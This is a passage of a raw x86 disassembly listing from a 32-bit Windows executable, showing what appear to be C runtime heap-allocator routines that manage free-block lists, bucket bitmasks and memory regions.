  424b65:	inc    DWORD PTR [ecx]
  424b67:	mov    ecx,DWORD PTR ds:0x45c58c
  424b6d:	mov    ecx,DWORD PTR [ecx+0x34]
  424b70:	test   ecx,ecx
  424b72:	je     0x424b76
  424b74:	inc    DWORD PTR [ecx]
  424b76:	mov    ecx,DWORD PTR ds:0x45c58c
  424b7c:	mov    ecx,DWORD PTR [ecx+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	inc    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR ds:0x45c58c
  424b8b:	mov    ecx,DWORD PTR [ecx+0x40]
  424b8e:	test   ecx,ecx
  424b90:	je     0x424b94
  424b92:	inc    DWORD PTR [ecx]
  424b94:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9a:	mov    ecx,DWORD PTR [ecx+0x4c]
  424b9d:	inc    DWORD PTR [ecx+0xb4]
  424ba3:	test   eax,eax
  424ba5:	je     0x424bba
  424ba7:	cmp    DWORD PTR [eax],0x0
  424baa:	jne    0x424bba
  424bac:	cmp    eax,0x45c538
  424bb1:	je     0x424bba
  424bb3:	push   eax
  424bb4:	call   0x424a33
  424bb9:	pop    ecx
  424bba:	mov    eax,DWORD PTR [esi+0x64]
  424bbd:	pop    esi
  424bbe:	ret    
  424bbf:	push   0xc
  424bc1:	push   0x428758
  424bc6:	call   0x423858
  424bcb:	push   0xc
  424bcd:	call   0x423a1f
  424bd2:	pop    ecx
  424bd3:	and    DWORD PTR [ebp-0x4],0x0
  424bd7:	call   0x424afd
  424bdc:	mov    DWORD PTR [ebp-0x1c],eax
  424bdf:	or     DWORD PTR [ebp-0x4],0xffffffff
  424be3:	call   0x424bf1
  424be8:	mov    eax,DWORD PTR [ebp-0x1c]
  424beb:	call   0x423893
  424bf0:	ret    
  424bf1:	push   0xc
  424bf3:	call   0x42398b
  424bf8:	pop    ecx
  424bf9:	ret    
  424bfa:	push   0x140
  424bff:	push   0x0
  424c01:	push   DWORD PTR ds:0x45d140
  424c07:	call   DWORD PTR ds:0x4280a4
  424c0d:	test   eax,eax
  424c0f:	mov    ds:0x45cf00,eax
  424c14:	jne    0x424c17
  424c16:	ret    
  424c17:	mov    ecx,DWORD PTR [esp+0x4]
  424c1b:	and    DWORD PTR ds:0x45cef8,0x0
  424c22:	and    DWORD PTR ds:0x45cefc,0x0
  424c29:	mov    ds:0x45cf08,eax
  424c2e:	xor    eax,eax
  424c30:	mov    DWORD PTR ds:0x45cf04,ecx
  424c36:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c40:	inc    eax
  424c41:	ret    
  424c42:	mov    eax,ds:0x45cefc
  424c47:	lea    ecx,[eax+eax*4]
  424c4a:	mov    eax,ds:0x45cf00
  424c4f:	lea    ecx,[eax+ecx*4]
  424c52:	jmp    0x424c66
  424c54:	mov    edx,DWORD PTR [esp+0x4]
  424c58:	sub    edx,DWORD PTR [eax+0xc]
  424c5b:	cmp    edx,0x100000
  424c61:	jb     0x424c6c
  424c63:	add    eax,0x14
  424c66:	cmp    eax,ecx
  424c68:	jb     0x424c54
  424c6a:	xor    eax,eax
  424c6c:	ret    
  424c6d:	push   ebp
  424c6e:	mov    ebp,esp
  424c70:	sub    esp,0x10
  424c73:	mov    ecx,DWORD PTR [ebp+0x8]
  424c76:	mov    eax,DWORD PTR [ecx+0x10]
  424c79:	push   esi
  424c7a:	mov    esi,DWORD PTR [ebp+0xc]
  424c7d:	push   edi
  424c7e:	mov    edi,esi
  424c80:	sub    edi,DWORD PTR [ecx+0xc]
  424c83:	add    esi,0xfffffffc
  424c86:	shr    edi,0xf
  424c89:	mov    ecx,edi
  424c8b:	imul   ecx,ecx,0x204
  424c91:	lea    ecx,[ecx+eax*1+0x144]
  424c98:	mov    DWORD PTR [ebp-0x10],ecx
  424c9b:	mov    ecx,DWORD PTR [esi]
  424c9d:	dec    ecx
  424c9e:	test   cl,0x1
  424ca1:	mov    DWORD PTR [ebp-0x4],ecx
  424ca4:	jne    0x424f81
  424caa:	push   ebx
  424cab:	lea    ebx,[ecx+esi*1]
  424cae:	mov    edx,DWORD PTR [ebx]
  424cb0:	mov    DWORD PTR [ebp-0xc],edx
  424cb3:	mov    edx,DWORD PTR [esi-0x4]
  424cb6:	mov    DWORD PTR [ebp-0x8],edx
  424cb9:	mov    edx,DWORD PTR [ebp-0xc]
  424cbc:	test   dl,0x1
  424cbf:	mov    DWORD PTR [ebp+0xc],ebx
  424cc2:	jne    0x424d38
  424cc4:	sar    edx,0x4
  424cc7:	dec    edx
  424cc8:	cmp    edx,0x3f
  424ccb:	jbe    0x424cd0
  424ccd:	push   0x3f
  424ccf:	pop    edx
  424cd0:	mov    ecx,DWORD PTR [ebx+0x4]
  424cd3:	cmp    ecx,DWORD PTR [ebx+0x8]
  424cd6:	jne    0x424d1a
  424cd8:	cmp    edx,0x20
  424cdb:	mov    ebx,0x80000000
  424ce0:	jae    0x424cfb
  424ce2:	mov    ecx,edx
  424ce4:	shr    ebx,cl
  424ce6:	lea    ecx,[edx+eax*1+0x4]
  424cea:	not    ebx
  424cec:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424cf0:	dec    BYTE PTR [ecx]
  424cf2:	jne    0x424d17
  424cf4:	mov    ecx,DWORD PTR [ebp+0x8]
  424cf7:	and    DWORD PTR [ecx],ebx
  424cf9:	jmp    0x424d17
  424cfb:	lea    ecx,[edx-0x20]
  424cfe:	shr    ebx,cl
  424d00:	lea    ecx,[edx+eax*1+0x4]
  424d04:	not    ebx
  424d06:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d0d:	dec    BYTE PTR [ecx]
  424d0f:	jne    0x424d17
  424d11:	mov    ecx,DWORD PTR [ebp+0x8]
  424d14:	and    DWORD PTR [ecx+0x4],ebx
  424d17:	mov    ebx,DWORD PTR [ebp+0xc]
  424d1a:	mov    edx,DWORD PTR [ebx+0x8]
  424d1d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d20:	mov    ecx,DWORD PTR [ebp-0x4]
  424d23:	add    ecx,DWORD PTR [ebp-0xc]
  424d26:	mov    DWORD PTR [edx+0x4],ebx
  424d29:	mov    edx,DWORD PTR [ebp+0xc]
  424d2c:	mov    ebx,DWORD PTR [edx+0x4]
  424d2f:	mov    edx,DWORD PTR [edx+0x8]
  424d32:	mov    DWORD PTR [ebx+0x8],edx
  424d35:	mov    DWORD PTR [ebp-0x4],ecx
  424d38:	mov    edx,ecx
  424d3a:	sar    edx,0x4
  424d3d:	dec    edx
  424d3e:	cmp    edx,0x3f
  424d41:	jbe    0x424d46
  424d43:	push   0x3f
  424d45:	pop    edx
  424d46:	mov    ebx,DWORD PTR [ebp-0x8]
  424d49:	and    ebx,0x1
  424d4c:	mov    DWORD PTR [ebp-0xc],ebx
  424d4f:	jne    0x424de4
  424d55:	sub    esi,DWORD PTR [ebp-0x8]
  424d58:	mov    ebx,DWORD PTR [ebp-0x8]
  424d5b:	sar    ebx,0x4
  424d5e:	push   0x3f
  424d60:	mov    DWORD PTR [ebp+0xc],esi
  424d63:	dec    ebx
  424d64:	pop    esi
  424d65:	cmp    ebx,esi
  424d67:	jbe    0x424d6b
  424d69:	mov    ebx,esi
  424d6b:	add    ecx,DWORD PTR [ebp-0x8]
  424d6e:	mov    edx,ecx
  424d70:	sar    edx,0x4
  424d73:	dec    edx
  424d74:	cmp    edx,esi
  424d76:	mov    DWORD PTR [ebp-0x4],ecx
  424d79:	jbe    0x424d7d
  424d7b:	mov    edx,esi
  424d7d:	cmp    ebx,edx
  424d7f:	je     0x424ddf
  424d81:	mov    ecx,DWORD PTR [ebp+0xc]
  424d84:	mov    esi,DWORD PTR [ecx+0x4]
  424d87:	cmp    esi,DWORD PTR [ecx+0x8]
  424d8a:	jne    0x424dc7
  424d8c:	cmp    ebx,0x20
  424d8f:	mov    esi,0x80000000
  424d94:	jae    0x424dad
  424d96:	mov    ecx,ebx
  424d98:	shr    esi,cl
  424d9a:	not    esi
  424d9c:	and    DWORD PTR [eax+edi*4+0x44],esi
  424da0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424da4:	jne    0x424dc7
  424da6:	mov    ecx,DWORD PTR [ebp+0x8]
  424da9:	and    DWORD PTR [ecx],esi
  424dab:	jmp    0x424dc7
  424dad:	lea    ecx,[ebx-0x20]
  424db0:	shr    esi,cl
  424db2:	not    esi
  424db4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424dbb:	dec    BYTE PTR [ebx+eax*1+0x4]
  424dbf:	jne    0x424dc7
  424dc1:	mov    ecx,DWORD PTR [ebp+0x8]
  424dc4:	and    DWORD PTR [ecx+0x4],esi
  424dc7:	mov    ecx,DWORD PTR [ebp+0xc]
  424dca:	mov    esi,DWORD PTR [ecx+0x8]
  424dcd:	mov    ecx,DWORD PTR [ecx+0x4]
  424dd0:	mov    DWORD PTR [esi+0x4],ecx
  424dd3:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd6:	mov    esi,DWORD PTR [ecx+0x4]
  424dd9:	mov    ecx,DWORD PTR [ecx+0x8]
  424ddc:	mov    DWORD PTR [esi+0x8],ecx
  424ddf:	mov    esi,DWORD PTR [ebp+0xc]
  424de2:	jmp    0x424de7
  424de4:	mov    ebx,DWORD PTR [ebp+0x8]
  424de7:	cmp    DWORD PTR [ebp-0xc],0x0
  424deb:	jne    0x424df5
  424ded:	cmp    ebx,edx
  424def:	je     0x424e75
  424df5:	mov    ecx,DWORD PTR [ebp-0x10]
  424df8:	lea    ecx,[ecx+edx*8]
  424dfb:	mov    ebx,DWORD PTR [ecx+0x4]
  424dfe:	mov    DWORD PTR [esi+0x8],ecx
  424e01:	mov    DWORD PTR [esi+0x4],ebx
  424e04:	mov    DWORD PTR [ecx+0x4],esi
  424e07:	mov    ecx,DWORD PTR [esi+0x4]
  424e0a:	mov    DWORD PTR [ecx+0x8],esi
  424e0d:	mov    ecx,DWORD PTR [esi+0x4]
  424e10:	cmp    ecx,DWORD PTR [esi+0x8]
  424e13:	jne    0x424e75
  424e15:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e19:	mov    BYTE PTR [ebp+0xf],cl
  424e1c:	inc    cl
  424e1e:	cmp    edx,0x20
  424e21:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e25:	jae    0x424e4c
  424e27:	cmp    BYTE PTR [ebp+0xf],0x0
  424e2b:	jne    0x424e3b
  424e2d:	mov    ecx,edx
  424e2f:	mov    ebx,0x80000000
  424e34:	shr    ebx,cl
  424e36:	mov    ecx,DWORD PTR [ebp+0x8]
  424e39:	or     DWORD PTR [ecx],ebx
  424e3b:	mov    ebx,0x80000000
  424e40:	mov    ecx,edx
  424e42:	shr    ebx,cl
  424e44:	lea    eax,[eax+edi*4+0x44]
  424e48:	or     DWORD PTR [eax],ebx
  424e4a:	jmp    0x424e75
  424e4c:	cmp    BYTE PTR [ebp+0xf],0x0
  424e50:	jne    0x424e62
  424e52:	lea    ecx,[edx-0x20]
  424e55:	mov    ebx,0x80000000
  424e5a:	shr    ebx,cl
  424e5c:	mov    ecx,DWORD PTR [ebp+0x8]
  424e5f:	or     DWORD PTR [ecx+0x4],ebx
  424e62:	lea    ecx,[edx-0x20]
  424e65:	mov    edx,0x80000000
  424e6a:	shr    edx,cl
  424e6c:	lea    eax,[eax+edi*4+0xc4]
  424e73:	or     DWORD PTR [eax],edx
  424e75:	mov    eax,DWORD PTR [ebp-0x4]
  424e78:	mov    DWORD PTR [esi],eax
  424e7a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424e7e:	mov    eax,DWORD PTR [ebp-0x10]
  424e81:	dec    DWORD PTR [eax]
  424e83:	jne    0x424f80
  424e89:	mov    eax,ds:0x45cef8
  424e8e:	test   eax,eax
  424e90:	je     0x424f72
  424e96:	mov    ecx,DWORD PTR ds:0x45cf10
  424e9c:	mov    esi,DWORD PTR ds:0x428084
  424ea2:	push   0x4000
  424ea7:	shl    ecx,0xf
  424eaa:	add    ecx,DWORD PTR [eax+0xc]
  424ead:	mov    ebx,0x8000
  424eb2:	push   ebx
  424eb3:	push   ecx
  424eb4:	call   esi
  424eb6:	mov    ecx,DWORD PTR ds:0x45cf10
  424ebc:	mov    eax,ds:0x45cef8
  424ec1:	mov    edx,0x80000000
  424ec6:	shr    edx,cl
  424ec8:	or     DWORD PTR [eax+0x8],edx
  424ecb:	mov    eax,ds:0x45cef8
  424ed0:	mov    eax,DWORD PTR [eax+0x10]
  424ed3:	mov    ecx,DWORD PTR ds:0x45cf10
  424ed9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424ee1:	mov    eax,ds:0x45cef8
  424ee6:	mov    eax,DWORD PTR [eax+0x10]
  424ee9:	dec    BYTE PTR [eax+0x43]
  424eec:	mov    eax,ds:0x45cef8
  424ef1:	mov    ecx,DWORD PTR [eax+0x10]
  424ef4:	cmp    BYTE PTR [ecx+0x43],0x0
  424ef8:	jne    0x424f03
  424efa:	and    DWORD PTR [eax+0x4],0xfffffffe
  424efe:	mov    eax,ds:0x45cef8
  424f03:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f07:	jne    0x424f72
  424f09:	push   ebx
  424f0a:	push   0x0
  424f0c:	push   DWORD PTR [eax+0xc]
  424f0f:	call   esi
  424f11:	mov    eax,ds:0x45cef8
  424f16:	push   DWORD PTR [eax+0x10]
  424f19:	push   0x0
  424f1b:	push   DWORD PTR ds:0x45d140
  424f21:	call   DWORD PTR ds:0x428088
  424f27:	mov    eax,ds:0x45cefc
  424f2c:	mov    edx,DWORD PTR ds:0x45cf00
  424f32:	lea    eax,[eax+eax*4]
  424f35:	shl    eax,0x2
  424f38:	mov    ecx,eax
  424f3a:	mov    eax,ds:0x45cef8
  424f3f:	sub    ecx,eax
  424f41:	lea    ecx,[ecx+edx*1-0x14]
  424f45:	push   ecx
  424f46:	lea    ecx,[eax+0x14]
  424f49:	push   ecx
  424f4a:	push   eax
  424f4b:	call   0x4267a0
  424f50:	mov    eax,DWORD PTR [ebp+0x8]
  424f53:	add    esp,0xc
  424f56:	dec    DWORD PTR ds:0x45cefc
  424f5c:	cmp    eax,DWORD PTR ds:0x45cef8
  424f62:	jbe    0x424f68
  424f64:	sub    DWORD PTR [ebp+0x8],0x14
  424f68:	mov    eax,ds:0x45cf00
  424f6d:	mov    ds:0x45cf08,eax
  424f72:	mov    eax,DWORD PTR [ebp+0x8]
  424f75:	mov    ds:0x45cef8,eax
  424f7a:	mov    DWORD PTR ds:0x45cf10,edi
  424f80:	pop    ebx
  424f81:	pop    edi
  424f82:	pop    esi
  424f83:	leave  
  424f84:	ret    
  424f85:	mov    eax,ds:0x45cefc
  424f8a:	mov    ecx,DWORD PTR ds:0x45cf0c
  424f90:	push   edi
  424f91:	xor    edi,edi
  424f93:	cmp    eax,ecx
  424f95:	jne    0x424fcb
  424f97:	lea    eax,[ecx+ecx*4+0x50]
  424f9b:	shl    eax,0x2
  424f9e:	push   eax
  424f9f:	push   DWORD PTR ds:0x45cf00
  424fa5:	push   edi
  424fa6:	push   DWORD PTR ds:0x45d140
  424fac:	call   DWORD PTR ds:0x4280b0
  424fb2:	cmp    eax,edi
  424fb4:	jne    0x424fba
  424fb6:	xor    eax,eax
  424fb8:	pop    edi
  424fb9:	ret    
  424fba:	add    DWORD PTR ds:0x45cf0c,0x10
  424fc1:	mov    ds:0x45cf00,eax
  424fc6:	mov    eax,ds:0x45cefc
  424fcb:	mov    ecx,DWORD PTR ds:0x45cf00
  424fd1:	push   esi
  424fd2:	push   0x41c4
  424fd7:	push   0x8
  424fd9:	push   DWORD PTR ds:0x45d140
  424fdf:	lea    eax,[eax+eax*4]
  424fe2:	lea    esi,[ecx+eax*4]
  424fe5:	call   DWORD PTR ds:0x4280a4
  424feb:	cmp    eax,edi
  424fed:	mov    DWORD PTR [esi+0x10],eax
  424ff0:	jne    0x424ff6
  424ff2:	xor    eax,eax
  424ff4:	jmp    0x425039
  424ff6:	push   0x4
  424ff8:	push   0x2000
  424ffd:	push   0x100000
  425002:	push   edi
  425003:	call   DWORD PTR ds:0x4280ac
  425009:	cmp    eax,edi
  42500b:	mov    DWORD PTR [esi+0xc],eax
  42500e:	jne    0x425022
  425010:	push   DWORD PTR [esi+0x10]
  425013:	push   edi
  425014:	push   DWORD PTR ds:0x45d140
  42501a:	call   DWORD PTR ds:0x428088
  425020:	jmp    0x424ff2
  425022:	or     DWORD PTR [esi+0x8],0xffffffff
  425026:	mov    DWORD PTR [esi],edi
  425028:	mov    DWORD PTR [esi+0x4],edi
  42502b:	inc    DWORD PTR ds:0x45cefc
  425031:	mov    eax,DWORD PTR [esi+0x10]
  425034:	or     DWORD PTR [eax],0xffffffff
  425037:	mov    eax,esi
  425039:	pop    esi
  42503a:	pop    edi
  42503b:	ret    
  42503c:	push   ebp
  42503d:	mov    ebp,esp
  42503f:	push   ecx
  425040:	push   ecx
  425041:	mov    ecx,DWORD PTR [ebp+0x8]
  425044:	mov    eax,DWORD PTR [ecx+0x8]
  425047:	push   ebx
  425048:	push   esi
  425049:	mov    esi,DWORD PTR [ecx+0x10]
  42504c:	push   edi
  42504d:	xor    ebx,ebx
  42504f:	jmp    0x425054
  425051:	shl    eax,1
  425053:	inc    ebx
  425054:	test   eax,eax
  425056:	jge    0x425051
  425058:	mov    eax,ebx
  42505a:	imul   eax,eax,0x204
  425060:	lea    eax,[eax+esi*1+0x144]
  425067:	push   0x3f
  425069:	mov    DWORD PTR [ebp-0x8],eax
  42506c:	pop    edx
  42506d:	mov    DWORD PTR [eax+0x8],eax
  425070:	mov    DWORD PTR [eax+0x4],eax
  425073:	add    eax,0x8
  425076:	dec    edx
  425077:	jne    0x42506d
  425079:	push   0x4
  42507b:	mov    edi,ebx
  42507d:	push   0x1000
  425082:	shl    edi,0xf
  425085:	add    edi,DWORD PTR [ecx+0xc]
  425088:	push   0x8000
  42508d:	push   edi
  42508e:	call   DWORD PTR ds:0x4280ac
  425094:	test   eax,eax
  425096:	jne    0x4250a0
  425098:	or     eax,0xffffffff
  42509b:	jmp    0x42513d
  4250a0:	lea    edx,[edi+0x7000]
  4250a6:	cmp    edi,edx
  4250a8:	mov    DWORD PTR [ebp-0x4],edx
  4250ab:	ja     0x4250f0
  4250ad:	mov    ecx,edx
  4250af:	sub    ecx,edi
  4250b1:	shr    ecx,0xc
  4250b4:	lea    eax,[edi+0x10]
  4250b7:	inc    ecx
  4250b8:	or     DWORD PTR [eax-0x8],0xffffffff
  4250bc:	or     DWORD PTR [eax+0xfec],0xffffffff
  4250c3:	lea    edx,[eax+0xffc]
  4250c9:	mov    DWORD PTR [eax],edx
  4250cb:	lea    edx,[eax-0x1004]
  4250d1:	mov    DWORD PTR [eax-0x4],0xff0
  4250d8:	mov    DWORD PTR [eax+0x4],edx
  4250db:	mov    DWORD PTR [eax+0xfe8],0xff0
  4250e5:	add    eax,0x1000
  4250ea:	dec    ecx
  4250eb:	jne    0x4250b8
  4250ed:	mov    edx,DWORD PTR [ebp-0x4]
  4250f0:	mov    eax,DWORD PTR [ebp-0x8]
  4250f3:	add    eax,0x1f8
  4250f8:	lea    ecx,[edi+0xc]
  4250fb:	mov    DWORD PTR [eax+0x4],ecx
  4250fe:	mov    DWORD PTR [ecx+0x8],eax
  425101:	lea    ecx,[edx+0xc]
  425104:	mov    DWORD PTR [eax+0x8],ecx
  425107:	mov    DWORD PTR [ecx+0x4],eax
  42510a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42510f:	xor    edi,edi
  425111:	inc    edi
  425112:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425119:	mov    al,BYTE PTR [esi+0x43]
  42511c:	mov    cl,al
  42511e:	inc    cl
  425120:	test   al,al
  425122:	mov    eax,DWORD PTR [ebp+0x8]
  425125:	mov    BYTE PTR [esi+0x43],cl
  425128:	jne    0x42512d
  42512a:	or     DWORD PTR [eax+0x4],edi
  42512d:	mov    edx,0x80000000
  425132:	mov    ecx,ebx
  425134:	shr    edx,cl
  425136:	not    edx
  425138:	and    DWORD PTR [eax+0x8],edx
  42513b:	mov    eax,ebx
  42513d:	pop    edi
  42513e:	pop    esi
  42513f:	pop    ebx
  425140:	leave  
  425141:	ret    
  425142:	push   ebp
  425143:	mov    ebp,esp
  425145:	sub    esp,0xc
  425148:	mov    ecx,DWORD PTR [ebp+0x8]
  42514b:	mov    eax,DWORD PTR [ecx+0x10]
  42514e:	push   ebx
  42514f:	push   esi
  425150:	mov    esi,DWORD PTR [ebp+0x10]
  425153:	push   edi
  425154:	mov    edi,DWORD PTR [ebp+0xc]
  425157:	mov    edx,edi
  425159:	sub    edx,DWORD PTR [ecx+0xc]
  42515c:	add    esi,0x17
  42515f:	shr    edx,0xf
  425162:	mov    ecx,edx
  425164:	imul   ecx,ecx,0x204
  42516a:	lea    ecx,[ecx+eax*1+0x144]
  425171:	mov    DWORD PTR [ebp-0xc],ecx
  425174:	mov    ecx,DWORD PTR [edi-0x4]
  425177:	and    esi,0xfffffff0
  42517a:	dec    ecx
  42517b:	cmp    esi,ecx
  42517d:	lea    edi,[ecx+edi*1-0x4]
  425181:	mov    ebx,DWORD PTR [edi]
  425183:	mov    DWORD PTR [ebp+0x10],ecx
  425186:	mov    DWORD PTR [ebp-0x4],ebx
  425189:	jle    0x4252e4
  42518f:	test   bl,0x1
  425192:	jne    0x4252dd
  425198:	add    ebx,ecx
  42519a:	cmp    esi,ebx
  42519c:	jg     0x4252dd
  4251a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251a5:	sar    ecx,0x4
  4251a8:	dec    ecx
  4251a9:	cmp    ecx,0x3f
  4251ac:	mov    DWORD PTR [ebp-0x8],ecx
  4251af:	jbe    0x4251b7
  4251b1:	push   0x3f
  4251b3:	pop    ecx
  4251b4:	mov    DWORD PTR [ebp-0x8],ecx
  4251b7:	mov    ebx,DWORD PTR [edi+0x4]
  4251ba:	cmp    ebx,DWORD PTR [edi+0x8]
  4251bd:	jne    0x425202
  4251bf:	cmp    ecx,0x20
  4251c2:	mov    ebx,0x80000000
  4251c7:	jae    0x4251e3
  4251c9:	shr    ebx,cl
  4251cb:	mov    ecx,DWORD PTR [ebp-0x8]
  4251ce:	lea    ecx,[ecx+eax*1+0x4]
  4251d2:	not    ebx
  4251d4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  4251d8:	dec    BYTE PTR [ecx]
  4251da:	jne    0x425202
  4251dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4251df:	and    DWORD PTR [ecx],ebx
  4251e1:	jmp    0x425202
  4251e3:	add    ecx,0xffffffe0
  4251e6:	shr    ebx,cl
  4251e8:	mov    ecx,DWORD PTR [ebp-0x8]
  4251eb:	lea    ecx,[ecx+eax*1+0x4]
  4251ef:	not    ebx
  4251f1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4251f8:	dec    BYTE PTR [ecx]
  4251fa:	jne    0x425202
  4251fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4251ff:	and    DWORD PTR [ecx+0x4],ebx
  425202:	mov    ecx,DWORD PTR [edi+0x8]
  425205:	mov    ebx,DWORD PTR [edi+0x4]
  425208:	mov    DWORD PTR [ecx+0x4],ebx
  42520b:	mov    ecx,DWORD PTR [edi+0x4]
  42520e:	mov    edi,DWORD PTR [edi+0x8]
  425211:	mov    DWORD PTR [ecx+0x8],edi
  425214:	mov    ecx,DWORD PTR [ebp+0x10]
  425217:	sub    ecx,esi
  425219:	add    DWORD PTR [ebp-0x4],ecx
  42521c:	cmp    DWORD PTR [ebp-0x4],0x0
  425220:	jle    0x4252cb
  425226:	mov    edi,DWORD PTR [ebp-0x4]
  425229:	mov    ecx,DWORD PTR [ebp+0xc]
  42522c:	sar    edi,0x4
  42522f:	dec    edi
  425230:	cmp    edi,0x3f
  425233:	lea    ecx,[ecx+esi*1-0x4]
  425237:	jbe    0x42523c
  425239:	push   0x3f
  42523b:	pop    edi
  42523c:	mov    ebx,DWORD PTR [ebp-0xc]
  42523f:	lea    ebx,[ebx+edi*8]
  425242:	mov    DWORD PTR [ebp+0x10],ebx
  425245:	mov    ebx,DWORD PTR [ebx+0x4]
  425248:	mov    DWORD PTR [ecx+0x4],ebx
  42524b:	mov    ebx,DWORD PTR [ebp+0x10]
  42524e:	mov    DWORD PTR [ecx+0x8],ebx
  425251:	mov    DWORD PTR [ebx+0x4],ecx
  425254:	mov    ebx,DWORD PTR [ecx+0x4]
  425257:	mov    DWORD PTR [ebx+0x8],ecx
  42525a:	mov    ebx,DWORD PTR [ecx+0x4]
  42525d:	cmp    ebx,DWORD PTR [ecx+0x8]
  425260:	jne    0x4252b9
  425262:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  425266:	mov    BYTE PTR [ebp+0x13],cl
  425269:	inc    cl
  42526b:	cmp    edi,0x20
  42526e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  425272:	jae    0x425290
  425274:	cmp    BYTE PTR [ebp+0x13],0x0
  425278:	jne    0x425288
  42527a:	mov    ecx,edi
  42527c:	mov    ebx,0x80000000
  425281:	shr    ebx,cl
  425283:	mov    ecx,DWORD PTR [ebp+0x8]
  425286:	or     DWORD PTR [ecx],ebx
  425288:	lea    eax,[eax+edx*4+0x44]
  42528c:	mov    ecx,edi
  42528e:	jmp    0x4252b0
  425290:	cmp    BYTE PTR [ebp+0x13],0x0
  425294:	jne    0x4252a6
  425296:	lea    ecx,[edi-0x20]
  425299:	mov    ebx,0x80000000
  42529e:	shr    ebx,cl
  4252a0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252a3:	or     DWORD PTR [ecx+0x4],ebx
  4252a6:	lea    eax,[eax+edx*4+0xc4]
  4252ad:	lea    ecx,[edi-0x20]
  4252b0:	mov    edx,0x80000000
  4252b5:	shr    edx,cl
  4252b7:	or     DWORD PTR [eax],edx
  4252b9:	mov    edx,DWORD PTR [ebp+0xc]
  4252bc:	mov    ecx,DWORD PTR [ebp-0x4]
  4252bf:	lea    eax,[edx+esi*1-0x4]
  4252c3:	mov    DWORD PTR [eax],ecx
  4252c5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  4252c9:	jmp    0x4252ce
  4252cb:	mov    edx,DWORD PTR [ebp+0xc]
  4252ce:	lea    eax,[esi+0x1]
  4252d1:	mov    DWORD PTR [edx-0x4],eax
  4252d4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  4252d8:	jmp    0x425419
  4252dd:	xor    eax,eax
  4252df:	jmp    0x42541c
  4252e4:	jge    0x425419
  4252ea:	mov    ebx,DWORD PTR [ebp+0xc]
  4252ed:	sub    DWORD PTR [ebp+0x10],esi
  4252f0:	lea    ecx,[esi+0x1]
  4252f3:	mov    DWORD PTR [ebx-0x4],ecx
  4252f6:	lea    ebx,[ebx+esi*1-0x4]
  4252fa:	mov    esi,DWORD PTR [ebp+0x10]
  4252fd:	sar    esi,0x4
  425300:	dec    esi
  425301:	cmp    esi,0x3f
  425304:	mov    DWORD PTR [ebp+0xc],ebx
  425307:	mov    DWORD PTR [ebx-0x4],ecx
  42530a:	jbe    0x42530f
  42530c:	push   0x3f
  42530e:	pop    esi
  42530f:	test   BYTE PTR [ebp-0x4],0x1
  425313:	jne    0x425399
  425319:	mov    esi,DWORD PTR [ebp-0x4]
  42531c:	sar    esi,0x4
  42531f:	dec    esi
  425320:	cmp    esi,0x3f
  425323:	jbe    0x425328
  425325:	push   0x3f
  425327:	pop    esi
  425328:	mov    ecx,DWORD PTR [edi+0x4]
  42532b:	cmp    ecx,DWORD PTR [edi+0x8]
  42532e:	jne    0x425372
  425330:	cmp    esi,0x20
  425333:	mov    ebx,0x80000000
  425338:	jae    0x425353
  42533a:	mov    ecx,esi
  42533c:	shr    ebx,cl
  42533e:	lea    esi,[esi+eax*1+0x4]
  425342:	not    ebx
  425344:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425348:	dec    BYTE PTR [esi]
  42534a:	jne    0x42536f
  42534c:	mov    ecx,DWORD PTR [ebp+0x8]
  42534f:	and    DWORD PTR [ecx],ebx
  425351:	jmp    0x42536f
  425353:	lea    ecx,[esi-0x20]
  425356:	shr    ebx,cl
  425358:	lea    ecx,[esi+eax*1+0x4]
  42535c:	not    ebx
  42535e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425365:	dec    BYTE PTR [ecx]
  425367:	jne    0x42536f
  425369:	mov    ecx,DWORD PTR [ebp+0x8]
  42536c:	and    DWORD PTR [ecx+0x4],ebx
  42536f:	mov    ebx,DWORD PTR [ebp+0xc]
  425372:	mov    ecx,DWORD PTR [edi+0x8]
  425375:	mov    esi,DWORD PTR [edi+0x4]
  425378:	mov    DWORD PTR [ecx+0x4],esi
  42537b:	mov    esi,DWORD PTR [edi+0x8]
  42537e:	mov    ecx,DWORD PTR [edi+0x4]
  425381:	mov    DWORD PTR [ecx+0x8],esi
  425384:	mov    esi,DWORD PTR [ebp+0x10]
  425387:	add    esi,DWORD PTR [ebp-0x4]
  42538a:	mov    DWORD PTR [ebp+0x10],esi
  42538d:	sar    esi,0x4
  425390:	dec    esi
  425391:	cmp    esi,0x3f
  425394:	jbe    0x425399
  425396:	push   0x3f
  425398:	pop    esi
  425399:	mov    ecx,DWORD PTR [ebp-0xc]
  42539c:	lea    ecx,[ecx+esi*8]
  42539f:	mov    edi,DWORD PTR [ecx+0x4]
  4253a2:	mov    DWORD PTR [ebx+0x8],ecx
  4253a5:	mov    DWORD PTR [ebx+0x4],edi
  4253a8:	mov    DWORD PTR [ecx+0x4],ebx
  4253ab:	mov    ecx,DWORD PTR [ebx+0x4]
  4253ae:	mov    DWORD PTR [ecx+0x8],ebx
  4253b1:	mov    ecx,DWORD PTR [ebx+0x4]
